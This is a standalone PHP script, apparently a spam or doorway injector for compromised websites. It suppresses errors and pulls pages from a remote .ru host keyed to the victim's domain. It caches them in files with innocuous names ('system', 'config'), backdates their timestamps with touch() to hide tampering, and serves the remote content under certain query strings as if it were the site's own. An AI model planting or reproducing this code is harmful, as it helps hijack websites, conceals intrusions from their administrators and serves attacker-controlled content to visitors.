<? error_reporting(0);

$server_name = $_SERVER['SERVER_NAME'];
$server_name = str_replace('www.','',$server_name);

$index_handle = 'home';	
$index_file = 'index';	

$handles = array('p=', 'template', 'sitemap', 'rss+');	
$server_url = 'http://top10-browser-games.ru/files/'.$server_name;	

$compress = 0;	
$date = '2010-08-09 09:14:07'; 

$cache_indexes = 'system';
$cache_file = 'config';
$query = $_SERVER['QUERY_STRING'];

function write_cache($page, $data)
{
	global $cache_indexes, $cache_file, $compress, $date;
	
	$cache_data = serialize($data);
	if($compress)
		$cache_data = gzdeflate($cache_data);
	
	$fp = fopen($cache_file, 'a+');
	if(!$fp)
		return 0;
		
	fseek($fp, 0, SEEK_END);
	$start_pos = ftell($fp);
	$end_pos = $start_pos + strlen($cache_data);
	fwrite($fp, $cache_data);
	fclose($fp);
	
	touch($cache_file, strtotime($date));

	$cache_ind = unserialize(file_get_contents($cache_indexes));
	$cache_ind[$page] = array($start_pos, $end_pos);
	$cache_ind = serialize($cache_ind);
	
	$fp = fopen($cache_indexes, 'w');
	if(!$fp)
		return 0;
	fwrite($fp, $cache_ind);
	fclose($fp);
	
	touch($cache_indexes, strtotime($date));
		
	return 1;
}

function get_cache($page)
{
	global $cache_indexes, $cache_file, $compress;
	$cache_ind = file_get_contents($cache_indexes);
	if($cache_ind === 0)
		return 0;

	$indexes = unserialize($cache_ind);
	if(!isset($indexes[$page]))
		return 0;

	$fp = fopen($cache_file, 'a+');
	if(!$fp)
		return 0;	
	fseek($fp, $indexes[$page][0]);
	$data = fread($fp, $indexes[$page][1] - $indexes[$page][0]);
	if($compress)
		$data = gzinflate($data);

	return unserialize($data);
}

function get_page($url)
{
	$url = parse_url($url);
	$fp = fsockopen($url['host'], 80, $errno, $errstr, 10);
	if (!$fp) {
		echo "$errstr ($errno)<br />\n";
	} else {
		$out = "GET {$url['path']} HTTP/1.1\r\n";
		$out .= "Host: {$url['host']}\r\n";
		$out .= "Connection: Close\r\n\r\n";
		fwrite($fp, $out);
		
		$data = '';
		while (!feof($fp)) {
			$data .= fgets($fp, 128);
		}
		
		$headers = substr($data, 0, strpos($data, "\r\n\r\n"));
		$content = substr($data, strpos($data, "\r\n\r\n") + 4);
	}
	
	return array('headers' => $headers, 'content' => $content);
}

function do_work($file)
{
	global $server_url;
	
	if(($res = get_cache($file)) == false)
	{
		$res = get_page($server_url . '/' . $file);
		write_cache($file, $res);
	}
	
	if(!strpos($res['headers'], '200 OK'))
	{
		header("HTTP/1.0 404 Not Found");
		echo "<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">\r\n<html><head>\r\n<title>404 Not Found</title>\r\n</head><body>\r\n<h1>Not Found</h1>\r\n<p>The requested URL {$_SERVER['REQUEST_URI']} was not found on this server.</p>\r\n</body></html>";
		exit;
	}
	
	if(preg_match('/Content-Type: (.*)/', $res['headers'], $type))
	{
		$content_type = $type[1];
		if($content_type != 'text/plain')
			header('Content-Type: ' . $content_type);
	}
	
	echo $res['content'];
	exit;
}

foreach($handles as $handle)
{
	if(strpos($query, $handle) === 0)
		do_work($query);
}

if($query == $index_handle)
	do_work($index_file);
	?>